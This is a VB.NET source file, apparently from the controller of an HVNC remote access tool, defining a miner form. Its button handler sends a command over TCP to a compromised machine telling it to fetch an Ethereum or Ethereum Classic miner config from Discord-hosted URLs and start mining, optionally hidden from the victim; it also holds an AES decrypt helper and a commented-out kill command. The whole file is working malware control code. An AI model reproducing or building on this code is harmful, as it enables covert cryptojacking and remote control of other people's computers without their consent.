Imports System
Imports System.IO
Imports System.Linq
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Runtime.Serialization.Formatters
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Security.Cryptography
Imports System.Text
Imports System.Windows.Forms

Namespace HVNC
	Partial Public Class FrmMiner
		Inherits Form

		Public Sub New()
			InitializeComponent()
		End Sub

		Private Sub Miner_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
			textBox3.Text = "Worker" & RandomMutex(4)
		End Sub


		Public Shared random As New Random()
		Public Shared Function RandomMutex(ByVal length As Integer) As String
			Const chars As String = "0123456789"
			Return New String(Enumerable.Repeat(chars, length).Select(Function(s) s(random.Next(s.Length))).ToArray())
		End Function

		Public Shared Function US(ByVal k As String, ByVal t As String) As String
			Dim iv(15) As Byte
			Dim buffer() As Byte = Convert.FromBase64String(t)

			Using aes As Aes = System.Security.Cryptography.Aes.Create()
				aes.Key = Encoding.UTF8.GetBytes(k)
				aes.IV = iv
				Dim decryptor As ICryptoTransform = aes.CreateDecryptor(aes.Key, aes.IV)

				Using memoryStream As New MemoryStream(buffer)
					Using cryptoStream As New CryptoStream(CType(memoryStream, Stream), decryptor, CryptoStreamMode.Read)
						Using streamReader As New StreamReader(CType(cryptoStream, Stream))
							Return streamReader.ReadToEnd()
						End Using
					End Using
				End Using
			End Using
		End Function

		Private Sub button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button1.Click

			If radioButtonETH.Checked = True Then
				If checkBox1.Checked = True Then
					SendTCP("55*" & "https://cdn.discordapp.com/attachments/859410781241475093/863207046005260298/ETH.txt" & "*" & comboBox2.Text & "*" & numericUpDown1.Value & "*" & textBox2.Text & "*Show*" & comboBox1.SelectedIndex.ToString(), DirectCast(MyBase.Tag, TcpClient))
				Else
					SendTCP("55*" & "https://cdn.discordapp.com/attachments/859410781241475093/863207046005260298/ETH.txt" & "*" & comboBox2.Text & "*" & numericUpDown1.Value & "*" & textBox2.Text & "*Hide*" & comboBox1.SelectedIndex.ToString(), DirectCast(MyBase.Tag, TcpClient))
				End If

				If radioButtonETH.Checked = True Then
					toolStripStatusLabel1.Text = "Logs : Command Sent ! ETH Miner will start.."
				Else
					toolStripStatusLabel1.Text = "Logs : Command Sent ! ETC Miner will start.."
				End If
			Else
				If checkBox1.Checked = True Then
					SendTCP("55*" & "https://cdn.discordapp.com/attachments/859410781241475093/863207018042228766/ETC.txt" & "*" & comboBox2.Text & "*" & numericUpDown1.Value & "*" & textBox2.Text & "*Show*" & comboBox1.SelectedIndex.ToString(), DirectCast(MyBase.Tag, TcpClient))
				Else
					SendTCP("55*" & "https://cdn.discordapp.com/attachments/859410781241475093/863207018042228766/ETC.txt" & "*" & comboBox2.Text & "*" & numericUpDown1.Value & "*" & textBox2.Text & "*Hide*" & comboBox1.SelectedIndex.ToString(), DirectCast(MyBase.Tag, TcpClient))
				End If

				If radioButtonETH.Checked = True Then
					toolStripStatusLabel1.Text = "Logs : Command Sent ! ETC Miner will start.."
				Else
					toolStripStatusLabel1.Text = "Logs : Command Sent ! ETC Miner will start.."
				End If
			End If


		End Sub

		Public Sub SendTCP(ByVal object_0 As Object, ByVal tcpClient_0 As TcpClient)



			If object_0 Is Nothing Then
				Return
			End If
			Dim binaryFormatter As New BinaryFormatter()
			binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple
			binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways
			binaryFormatter.FilterLevel = TypeFilterLevel.Full
'INSTANT VB TODO TASK: There is no equivalent to a 'checked' block in VB:
'			checked
				SyncLock tcpClient_0
					Dim objectValue As Object = RuntimeHelpers.GetObjectValue(object_0)
					Dim num As ULong = 0uL
					Dim memoryStream As New MemoryStream()
					binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue))
					num = CULng(memoryStream.Position)
					tcpClient_0.GetStream().Write(BitConverter.GetBytes(num), 0, 8)
					Dim buffer() As Byte = memoryStream.GetBuffer()
					tcpClient_0.GetStream().Write(buffer, 0, CInt(num))
					memoryStream.Close()
					memoryStream.Dispose()
				End SyncLock
'INSTANT VB TODO TASK: End of the original C# 'checked' block.
		End Sub

		Private Sub button2_Click(ByVal sender As Object, ByVal e As EventArgs)
		   ' SendTCP("50*", (TcpClient)base.Tag); // Kill
		End Sub
	End Class
End Namespace
